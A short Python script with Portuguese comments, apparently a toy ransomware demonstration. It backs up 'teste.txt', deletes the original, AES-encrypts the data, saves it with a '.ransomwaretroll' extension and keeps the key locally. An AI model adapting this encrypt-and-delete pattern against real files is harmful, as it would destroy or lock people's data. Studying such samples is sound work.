import os
import pyaes
import secrets

# Função para gerar uma chave aleatória de 16 bytes
def gerar_chave():
    return secrets.token_bytes(16)

# Função para criptografar arquivo
def criptografar_arquivo(file_name):
    # Verificar se o arquivo existe
    if not os.path.exists(file_name):
        print(f"Erro: O arquivo {file_name} não existe.")
        return

    # Abrir o arquivo a ser criptografado
    with open(file_name, "rb") as file:
        file_data = file.read()

    # Criar backup do arquivo original
    backup_file = file_name + ".bak"
    with open(backup_file, "wb") as backup:
        backup.write(file_data)
    print(f"Backup do arquivo criado: {backup_file}")

    # Remover o arquivo original
    os.remove(file_name)

    # Gerar uma chave aleatória para criptografia
    key = gerar_chave()
    aes = pyaes.AESModeOfOperationCTR(key)

    # Criptografar o arquivo
    crypto_data = aes.encrypt(file_data)

    # Salvar o arquivo criptografado
    new_file = file_name + ".ransomwaretroll"
    with open(new_file, "wb") as new_file_obj:
        new_file_obj.write(crypto_data)

    # Salvar a chave de criptografia em um arquivo seguro (NÃO SE ESQUECER DE MANEIRA NENHUMA DE SALVAR E ARMAZENAR ESSA CHAVE)
    chave_file = file_name + ".key"
    with open(chave_file, "wb") as key_file:
        key_file.write(key)

    print(f"Arquivo criptografado salvo como: {new_file}")
    print(f"A chave de criptografia foi salva em: {chave_file}")

# Chamada da função
file_name = "teste.txt"  # Nome do arquivo a ser criptografado pelo código
criptografar_arquivo(file_name)
